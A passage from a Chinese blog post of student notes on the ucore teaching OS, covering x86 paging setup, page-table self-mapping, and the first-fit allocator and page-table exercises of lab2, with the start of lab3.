</p><p>也请注意，这个起始虚拟地址的变化其实并不会影响一般的跳转和函数调用，因为它们实际上是相对跳转。但是，对于绝对寻址的全局变量的引用，就需要用REALLOC宏(即将要重新计算的地址-0xC0100000)进行一些运算来确保地址是正确的。</p><h4 id="第一个阶段"><a href="#第一个阶段" class="headerlink" title="第一个阶段"></a>第一个阶段</h4><p>（开启保护模式，创建启动段表）是bootloader阶段，即从bootloader的start函数（在boot/bootasm.S中）到执行ucore kernel的kern_entry函数之前，其虚拟地址、线性地址以及物理地址之间的映射关系与lab1的一样，即：</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab2 stage <span class="hljs-number">1</span>: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><h4 id="第二个阶段"><a href="#第二个阶段" class="headerlink" title="第二个阶段"></a>第二个阶段</h4><p>（创建初始页目录表，开启分页模式）从kern_entry函数开始，到pmm_init函数被执行之前。</p><p>编译好的ucore自带了一个**设置好的(就在entry.S里, 也不知道为什么要设置成两段映射)**页目录表和相应的页表，将0~4M的线性地址一一映射到物理地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">.align PGSIZE<br>__boot_pgdir:<br>.globl __boot_pgdir<br>    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    # 这个左移两位是乘以4的意思, 即(PDE *)__boot_pgdir + PDX(KERNBASE), <br>    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to the PDE of KERNBASE<br>    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE<br><br>.set i, 0<br>__boot_pt1:<br>.rept 1024# repeat 1024 times, a page table<br>    .long i * PGSIZE + (PTE_P | PTE_W)<br>    .set i, i + 1<br>.endr<br></code></pre></div></td></tr></table></figure><p>了解了一一映射的二级页表结构后，接下来就要使能分页机制了，这主要是通过几条汇编指令（在kern/init/entry.S中）实现的，主要做了两件事：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># load pa of boot pgdir<br>movl $REALLOC(__boot_pgdir), %eax<br>movl %eax, %cr3# 1.把页目录表的起始地址存入CR3寄存器中；<br><br># enable paging<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br>movl %eax, %cr0# 2.把cr0中的CR0_PG标志位设置上。<br></code></pre></div></td></tr></table></figure><p>执行完这几条指令后，计算机系统进入了分页模式！虚拟地址、线性地址以及物理地址之间的临时映射关系为：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lab2 stage 2 before:<br>    virt addr = linear addr = phy addr # 线性地址在0~4MB之内三者的映射关系<br>    virt addr = linear addr = phy addr + 0xC0000000 # 线性地址在0xC0000000~0xC0000000+4MB之内三者的映射关系<br></code></pre></div></td></tr></table></figure><p>可以看到，其实仅仅比第一个阶段增加了下面一行的0xC0000000偏移的映射，并且作用范围缩小到了0~4M。在下一个阶段, 会将作用范围继续扩充到0~KMEMSIZE。</p><p>实际上这种映射限制了内核的大小。当内核大小超过预期的4MB （实际上是3M，因为内核从 0x100000开始编址）就可能导致打开分页之后内核crash，在某些试验中，也的确出现了这种情况。解决方法同样简单，就是正确填充更多的页目录项即可。</p><p>此时的内核（EIP）还在0~4M的低虚拟地址区域运行，而在之后，这个区域的虚拟内存是要给用户程序使用的。为此，需要使用一个绝对跳转来使内核跳转到高虚拟地址（代码在kern/init/entry.S中）：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # update eip<br>    # now, eip = 0x1.....<br>    leal next, %eax<br>    # set eip = KERNBASE + 0x1.....<br>    jmp *%eax<br>next:<br></code></pre></div></td></tr></table></figure><p>跳转完毕后，通过把boot_pgdir[0]对应的第一个页目录表项（0~4MB）清零来取消了临时的页映射关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># unmap va 0 ~ 4M, it&#x27;s temporary mapping<br>xorl %eax, %eax<br>movl %eax, __boot_pgdir<br></code></pre></div></td></tr></table></figure><p>最终，离开这个阶段时，虚拟地址、线性地址以及物理地址之间的映射关系为：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">2</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span> <span class="hljs-comment"># 线性地址在0xC0000000~0xC0000000+4MB之内三者的映射关系</span><br></code></pre></div></td></tr></table></figure><p>总结来看，这一阶段的目的就是更新映射关系的同时将运行中的内核（EIP）从低虚拟地址“迁移”到高虚拟地址，而不造成伤害。</p><p>不过，这还不是我们期望的映射关系，因为它仅仅映射了0~4MB。对于段表而言，也缺少了运行ucore所需的用户态段描述符和TSS（段）描述符相应表项。</p><h4 id="第三个阶段"><a href="#第三个阶段" class="headerlink" title="第三个阶段"></a>第三个阶段</h4><p>（完善段表和页表）从pmm_init函数被调用开始。pmm_init函数将页目录表项补充完成（从0~4M扩充到0~KMEMSIZE）。然后，更新了段映射机制，使用了一个新的段表。这个新段表除了包括内核态的代码段和数据段描述符，还包括用户态的代码段和数据段描述符以及TSS（段）的描述符。理论上可以在第一个阶段，即bootloader阶段就将段表设置完全，然后在此阶段继续使用，但这会导致内核的代码和bootloader的代码产生过多的耦合，于是就有了目前的设计。</p><p>这时形成了我们期望的虚拟地址、线性地址以及物理地址之间的映射关系：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">3</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><p>段表相应表项和TSS也被设置妥当。</p><h3 id="自映射机制"><a href="#自映射机制" class="headerlink" title="自映射机制"></a>自映射机制</h3><p><strong>4GB内存都有用到吗?</strong> </p><p>众所周知, 从物理地址空间中的每一个block分配page table之后(在default_init_memmap完成), 虚拟地址空间是一片连续的空间, 从0xC0000000开始, 大小为0x38000000=896MB, 并没有用完全部4GB的地址空间, 这只是一个设定, 可以根据情况进行改变.<br>memlayout.h中定义了常量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE 0xC0000000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMEMSIZE 0x38000000 <span class="hljs-comment">// the maximum amount of physical memory</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNTOP (KERNBASE + KMEMSIZE)</span><br><span class="hljs-comment">//------------------------------</span><br>define VPT<span class="hljs-number">0xFAC00000</span><br></code></pre></div></td></tr></table></figure><p><strong>自映射是什么?</strong> </p><p>注意到每一个4KB页表中有1k个4B的pte, 每个pte指向物理空间中4KB的page, 整个page table指向了虚拟空间中4MB大小的pages. 如果我们把映射4GB空间的4MB页表放在4MB对齐的虚拟地址处, 那么可以想到有一个页表刚好映射他所在的4MB区域, 于是就充当了页目录表的功能.</p><p>具体而言，ucore是这样设计的，首先设置了一个常量（memlayout.h）：</p><p>VPT=<strong>0xFAC00000</strong>， 这个地址的二进制表示为：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">1111</span> <span class="hljs-number">1010</span> <span class="hljs-number">11</span>|<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>| <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span><span class="hljs-comment">//管道符号表示虚拟地址的三个部分</span><br></code></pre></div></td></tr></table></figure><p>高10位为1111 1010 11，即10进制的1003，中间10位为0，低12位也为0。在pmm.c中有两个全局初始化变量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">pte_t</span> * <span class="hljs-keyword">const</span> vpt = (<span class="hljs-keyword">pte_t</span> *)VPT;<br><span class="hljs-keyword">pde_t</span> * <span class="hljs-keyword">const</span> vpd = (<span class="hljs-keyword">pde_t</span> *)PGADDR(PDX(VPT), PDX(VPT), <span class="hljs-number">0</span>);<span class="hljs-comment">//这个宏用来拼接虚拟地址</span><br></code></pre></div></td></tr></table></figure><p>并在pmm_init函数执行了如下语句：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br></code></pre></div></td></tr></table></figure><p>这些变量和语句有何特殊含义呢？<strong>其实vpd变量的值就是页目录表的起始虚地址0xFAFEB000</strong>，且它的高10位和中10位是相等的，都是10进制的1003。当执行了上述语句，就确保了vpd变量的值就是页目录表的起始虚地址，且vpt是页目录表中第一个目录表项指向的页表的起始虚地址。此时描述内核虚拟空间的页目录表的虚地址为0xFAFEB000，大小为4KB。页表的理论连续虚拟地址空间0xFAC00000~0xFB000000，大小为4MB。因为这个连续地址空间的大小为4MB，可有1M个PTE，即可映射4GB的地址空间。</p><p><strong>有什么好处?</strong> </p><p>在页机制建立好后, 如果我们这时需要按虚拟地址的地址顺序显示整个页目录表和页表的内容，则要查找页目录表的页目录表项内容，根据页目录表项内容找到页表的物理地址**(pdt和pt为什么存放的是物理地址?)**，再转换成对应的虚地址，然后访问页表的虚地址，搜索整个页表的每个页目录项。这样过程比较繁琐。</p><p>但是利用以上的方法, 通过连续扫描这特定的4MB虚拟地址空间，就很容易访问每个页目录表项和页表项内容。</p><p>在pmm.c中的函数<code>print_pgdir</code>就是基于ucore的页表自映射方式完成了对整个页目录表和页表的内容扫描和打印。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//print_pgdir - print the PDT&amp;PT</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">print_pgdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    cprintf(<span class="hljs-string">&quot;-------------------- BEGIN --------------------\n&quot;</span>);<br>    <span class="hljs-keyword">size_t</span> left, right = <span class="hljs-number">0</span>, perm;<br>    <span class="hljs-comment">//找出一个页目录表权限相同的range, 存在left和right中</span><br>    <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(<span class="hljs-number">0</span>, NPDEENTRY, right, vpd, &amp;left, &amp;right)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//几个数字分别代表range中条目数量,虚地址范围,大小,权限</span><br>        cprintf(<span class="hljs-string">&quot;PDE(%03x) %08x-%08x %08x %s\n&quot;</span>, right - left,<br>                left * PTSIZE, right * PTSIZE, (right - left) * PTSIZE, perm2str(perm));<br>        <span class="hljs-keyword">size_t</span> l, r = left * NPTEENTRY;<br>        <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(left * NPTEENTRY, right * NPTEENTRY, r, vpt, &amp;l, &amp;r)) != <span class="hljs-number">0</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;  |-- PTE(%05x) %08x-%08x %08x %s\n&quot;</span>, r - l,<br>                    l * PGSIZE, r * PGSIZE, (r - l) * PGSIZE, perm2str(perm));<br>        &#125;<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;--------------------- END ---------------------\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="练习3-2"><a href="#练习3-2" class="headerlink" title="练习3+2"></a>练习3+2</h2><h3 id="练习一-1"><a href="#练习一-1" class="headerlink" title="练习一"></a>练习一</h3><blockquote><p>实现 first-fit 连续物理内存分配算法</p></blockquote><ul><li>简单的修改了几个函数, 甚至不用全都改, 不过free函数我调试了好久</li></ul><h4 id="default-init-memmap"><a href="#default-init-memmap" class="headerlink" title="default_init_memmap"></a>default_init_memmap</h4><ul><li><p>该函数将新页面插入链表时，没有按照地址顺序插入</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>故需要修改该行代码，使其按地址顺序插入至双向链表中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add_before(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-alloc-pages"><a href="#default-alloc-pages" class="headerlink" title="default_alloc_pages"></a>default_alloc_pages</h4><ul><li><p>在原先的代码中，当获取到了一个大小足够大的页面地址时，程序会先将该页头从链表中断开，切割，并将剩余空间放回链表中。但将<em>剩余空间放回链表</em>时，并没有按照地址顺序插入链表。</p><blockquote><p>连续空闲页面中的第一个页称为页头，page header。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    list_del(&amp;(page-&gt;page_link));<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        <span class="hljs-comment">// 注意这一步</span><br>        list_add(&amp;free_list, &amp;(p-&gt;page_link));<br>    &#125;<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>以下是修改后的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        SetPageProperty(p);<br>        <span class="hljs-comment">// 注意这一步add after</span><br>        list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));<br>    &#125;<br>    list_del(&amp;(page-&gt;page_link));<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-free-pages"><a href="#default-free-pages" class="headerlink" title="default_free_pages"></a>default_free_pages</h4><ul><li><p>该函数默认会在函数末尾处，将待释放的页头插入至链表的第一个节点。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>所以我们需要修改这部分代码，使其按地址顺序插入至对应的链表结点处。</p><p>可以在循环中记录比这个page地址小的free_page, 而且还要设置标记来表明是否有这么一个page, 具体参见源码</p></li></ul><h3 id="练习二-1"><a href="#练习二-1" class="headerlink" title="练习二"></a>练习二</h3><blockquote><p><strong>实现寻找虚拟地址对应的页表项</strong>.</p></blockquote><blockquote><p>通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。</p><p>其中的<code>get_pte</code>函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。</p></blockquote><p>以下为实现的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">pte_t</span> * <span class="hljs-title">get_pte</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">uintptr_t</span> la, <span class="hljs-keyword">bool</span> create)</span> </span>&#123;<br>    <span class="hljs-comment">// 获取传入的线性地址中所对应的页目录条目的物理地址</span><br>    <span class="hljs-keyword">pde_t</span> *pdep = PDX(la) + pgdir;<br>    <span class="hljs-comment">// 如果该条目不可用(not present)</span><br>    <span class="hljs-keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>        <span class="hljs-comment">// 如果分配页面失败，或者不允许分配，则返回NULL</span><br>        <span class="hljs-keyword">if</span> (!create || (page = alloc_page()) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 设置该物理页面的引用次数为1</span><br>        set_page_ref(page, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 获取当前物理页面所管理的物理地址</span><br>        <span class="hljs-keyword">uintptr_t</span> pa = page2pa(page);<br>        <span class="hljs-comment">// 清空该物理页面的数据。需要注意的是使用虚拟地址</span><br>        <span class="hljs-built_in">memset</span>(KADDR(pa), <span class="hljs-number">0</span>, PGSIZE);<br>        <span class="hljs-comment">// 将新分配的页面设置为当前缺失的页目录条目中</span><br>        <span class="hljs-comment">// 之后该页面就是其中的一个二级页面</span><br>        *pdep = pa | PTE_U | PTE_W | PTE_P;<br>    &#125;<br>    <span class="hljs-comment">// 返回在pgdir中对应于la的二级页表项, 注意是虚拟地址, 因为返回一个物理地址也没啥用, cpu操作不了</span><br>    <span class="hljs-keyword">pte_t</span> *ptep = (<span class="hljs-keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)) + PTX(la);<br>    <span class="hljs-keyword">return</span> ptep; <br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>请描述页目录项（Pag Director Entry）和页表（Page Table Entry）中每个组成部分的含义和以及对ucore而言的潜在用处。</p><blockquote><p>请查看<a href="#vpt&pdt">虚拟页表结构</a></p></blockquote></li><li><p>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</p><ul><li>将引发页访问异常的地址将被保存在cr2寄存器中</li><li>设置错误代码</li><li>引发Page Fault，将外存的数据换到内存中</li><li>进行上下文切换，退出中断，返回到中断前的状态</li></ul></li></ul><h3 id="练习三-1"><a href="#练习三-1" class="headerlink" title="练习三"></a>练习三</h3><blockquote><p>释放某虚地址所在的页并取消对应二级页表项的映射</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) <span class="hljs-comment">//(1) check if this page table entry is present</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep); <span class="hljs-comment">//(2) find corresponding page to pte</span><br><br>    <span class="hljs-keyword">if</span> (page_ref_dec(page) == <span class="hljs-number">0</span>) <span class="hljs-comment">//(3) decrease page reference</span><br>    &#123;<br>        free_page(page); <span class="hljs-comment">//(4) and free this page when page reference reachs 0</span><br>    &#125;<br>    *ptep = <span class="hljs-number">0</span>;                 <span class="hljs-comment">//(5) clear second page table entry</span><br>    tlb_invalidate(pgdir, la); <span class="hljs-comment">//(6) flush tlb</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>两个问题:</p><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">数据结构Page的全局变量（其实是一个数组）的每一项与页表中的页目录项和页表项有无对应关系？如果有，其对应关系是啥？</p><p>CPU如果要访问内存地址, 送出CPU的肯定是虚拟地址, 经过MMU的转换完成虚拟地址到物理地址的转换.</p><p>在MMU中, 取出虚拟地址高10位和%cr3拼接成页目录表条目(pdte), 读取出内存中的页目录表(或者在MMU中的TLB)所存储的页表物理地址, 然后发送这个物理地址+虚拟地址中间十位到内存中访问到页表条目, 读出所在page的物理地址, 然后再和虚拟地址低12位拼接成物理地址到内存中访问. </p><p>如果没有TLB, 这中间会有多次访存:</p><ol><li>为读取目录项而访问主存。</li><li>为读取页表项而访问主存。</li><li>为读取操作数或指令而访问主存。</li></ol><p>回答本文章中的一个问题: <strong>为什么页目录表和页表存储的是对应的物理地址而不是虚拟地址?</strong> </p><p>原因也明了了, 这两个表就是MMU和内存合作完成虚拟地址到物理地址转换的基础, 而虚拟地址是在内核中使用的一个抽象连续空间的地址, 和MMU关系不大, 更不必往表项里存储虚拟地址, 何况这么做还会导致递归查找<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="即原先查找页目录表的目的是想将某个线性地址转换为物理地址，但如果页目录表中存放的是二级页表的线性地址，则需要先查找该二级页表的物理地址，此时需要递归查找，这可能会出现永远也查找不到物理地址的情况。">[1]</span></a></sup> </p><p class="note note-primary" style="font-style:italic;background-color:rgb(240,230,250)">如果希望虚拟地址与物理地址相等，则需要如何修改lab2，完成此事？ 鼓励通过编程来具体完成这个问题 </p><ul><li><p>将<code>labcodes/lab2/tools/kernel.ld</code>中的加载地址从<code>0xC0100000</code>修改为<code>0x0</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 修改前</span><br>. = <span class="hljs-number">0xC0100000</span>;<br><span class="hljs-comment">// 修改后</span><br>. = <span class="hljs-number">0x0</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>将<code>mm/</code>中的内核偏移地址修改为0</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 修改前</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE            0xC0000000</span><br><span class="hljs-comment">// 修改后</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE            0x0</span><br></code></pre></div></td></tr></table></figure></li><li><p>最后一步，但也是必须要做的一步——<strong>关闭页机制</strong>。将开启页机制的那一段代码删除或注释掉最后一句即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># 修改后<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br># 注释了最后一句<br># movl %eax, %cr0<br></code></pre></div></td></tr></table></figure></li><li><p>需要注意的是，需要把开启页表关闭，否则会报错，**因为页表开启时认为偏移量不为0(有待考证)**。</p></li></ul><h3 id="拓展练习-1"><a href="#拓展练习-1" class="headerlink" title="拓展练习"></a>拓展练习</h3><h4 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h4><blockquote><p><strong>buddy system（伙伴系统）分配算法, <a href="http://coolshell.cn/articles/10427.html">伙伴分配器的一个极简实现</a> <a href="https://github.com/wuwenbin/buddy2/blob/master/buddy2.c">具体实现</a></strong></p><p>Buddy System算法把系统中的可用存储空间划分为存储块(Block)来进行管理, 每个存储块的大小必须是2的n次幂(Pow(2, n)), 即1, 2, 4, 8, 16, 32, 64, 128…</p></blockquote><p>经过一番思考, 属于是没搞懂用在这里的优势在哪, 分配的时候得遍历一遍双向链表, 找到了再分割, 和FIFO没啥区别, 释放时稍微有一点优势,  但最主要的问题是如果内存探测弄出的block很多的话也就只有略微有一点优势, 至于用双向链表而不是二叉树就更离谱了, 不如不写</p><h4 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h4><blockquote><p>slub算法，实现两层架构的高效内存单元分配，第一层是基于页大小的内存分配，第二层是在第一层基础上实现基于任意大小的内存分配。可简化实现，能够体现其主体思想即可。</p><ul><li>参考<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-slub/">linux的slub分配算法/</a>，在ucore中实现slub分配算法。要求有比较充分的测试用例说明实现的正确性，需要有设计文档。</li></ul></blockquote><h1 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成"><a href="#0-项目组成" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验二，实验三主要改动如下：</p><ul><li>kern/mm/default_pmm.[ch]：实现基于struct pmm_manager类框架的Fist-Fit物理内存分配参考实现（分配最小单位为页，即4096字节），相关分配页和释放页等实现会间接被kmalloc/kfree等函数使用。</li><li>kern/mm/pmm.[ch]：pmm.h定义物理内存分配类框架struct 